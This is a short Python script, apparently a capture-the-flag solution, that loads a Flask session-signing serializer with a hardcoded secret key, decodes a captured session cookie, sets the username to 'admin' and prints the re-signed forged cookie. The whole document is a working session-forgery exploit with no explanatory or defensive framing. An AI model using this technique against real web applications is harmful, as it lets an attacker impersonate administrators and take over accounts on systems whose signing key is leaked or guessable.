from flask.sessions import SecureCookieSessionInterface

class App(object):
    secret_key = '9f516783b42730b7888008dd5c15fe66'

s = SecureCookieSessionInterface().get_signing_serializer(App())
u = s.loads('.eJwVzEsOgzAMRdG9vDGq8jUom6lc15GiFiNBGFXsnfSOzuj-8OIvmyiKd6OHmyDbaR3lr2Ovz7591FAQl-DfSqw-VZqJcmLhQMIpR1qkzhQohpwx4Tx0N17HFL3Z2gzXDVfMHvA.XBusbg.VxEwtSCbiPlmwI3IA0S_E8FU8UU')
u['username'] = "admin"
print(s.dumps(u))